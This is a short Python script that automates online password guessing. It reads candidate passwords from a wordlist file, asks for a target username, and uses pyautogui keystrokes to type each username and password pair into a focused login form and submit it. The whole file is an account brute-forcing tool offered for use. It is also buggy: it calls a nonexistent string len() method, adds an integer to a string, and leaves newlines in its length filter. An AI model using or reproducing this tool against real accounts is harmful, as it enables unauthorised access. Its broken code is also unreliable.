# ~ "THE BEER-WARE LICENSE" (Revision 42):
# ~ <pettit.matt@gmail.com> wrote this file. As long as you retain this notice you
# ~ can do whatever you want with this stuff. If we meet some day, and you think
# ~ this stuff is worth it, you can buy me a beer in return. Matt Pettit


import pyautogui, time

passes = []
listofpass = open('pass.txt','r')
listofpass = listofpass.readlines()

for item in listofpass:
    if item.len() == 6:
        passes.append(item)

username = input("Enter username(no quotation marks)")
print('Starting in 5 secs')

time.sleep(5)

for item in passes:
    pyautogui.typewrite(username)
    pyautogui.press('tab')
    pyautogui.typewrite(item)
    print('Trying',str(item))
    pyautogui.press('enter')
    time.sleep(3)
print('Tried '+ len(passes)+' Passwords.')
